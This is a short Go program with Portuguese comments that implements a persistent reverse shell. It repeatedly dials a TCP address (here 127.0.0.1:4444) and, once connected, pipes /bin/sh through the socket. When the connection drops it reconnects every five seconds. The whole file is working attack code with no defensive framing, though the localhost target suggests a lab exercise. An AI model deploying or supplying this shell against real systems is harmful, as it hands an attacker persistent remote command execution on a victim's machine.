package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	target := "127.0.0.1:4444"

	for {
		// Tenta conectar
		conn, err := net.Dial("tcp", target)

		if err != nil {
			// Se falhar, espera 5 segundos e tenta o loop de novo
			time.Sleep(5 * time.Second)
			continue
		}

		// Se conectar, executa o shell
		cmd := exec.Command("/bin/sh")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		// O código fica "preso" aqui enquanto a conexão durar
		cmd.Run()

		// Se a conexão cair, ele sai do cmd.Run() e volta para o início do for
		conn.Close()
	}
}
